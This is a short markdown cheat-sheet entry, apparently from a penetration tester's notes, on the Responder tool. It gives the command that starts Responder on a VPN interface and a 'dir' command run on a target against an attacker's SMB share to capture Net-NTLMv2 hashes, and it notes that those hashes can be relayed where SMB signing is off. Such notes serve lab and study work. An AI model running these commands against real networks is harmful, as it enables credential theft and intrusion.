---
tags:
  - tool
  - packet_capture
---
# responder

Capture connections

## Capabilities

```bash
# Listen for incoming requests
sudo responder -I tun0
```

Capture `Net-NTLMv2` hashes by initiating a request via the following command on the target. These hashes can be relayed so long as SMB signing is disabled.

```powershell
dir \\192.168.45.204\test
```
